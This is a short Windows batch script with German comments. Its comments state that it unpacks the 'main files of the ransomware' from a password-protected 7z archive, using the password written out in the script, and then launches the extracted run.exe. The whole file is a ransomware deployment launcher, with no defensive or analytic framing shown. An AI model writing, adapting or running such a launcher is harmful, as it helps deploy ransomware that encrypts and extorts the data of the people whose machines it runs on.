@echo off
:: Entpackt das Archiv mit den Hauptdatein der Ransomeware mit 7zip in das aktuelle Verzeichnis
:: Passwort "T2N66iYe7lKE19LL" wird für die Entpackung verwendet

echo Entpacken von data.7z...
7z x data.7z -pT2N66iYe7lKE19LL -y

:: Überprüfen, ob das Entpacken erfolgreich war
if errorlevel 1 (
    echo Fehler beim Entpacken des Archivs!
    exit /b 1
)

:: Überprüfen, ob "run.exe" existiert
if exist "run.exe" (
    echo Starte run.exe...
    run.exe
) else (
    echo run.exe wurde nicht gefunden!
    exit /b 1
)

exit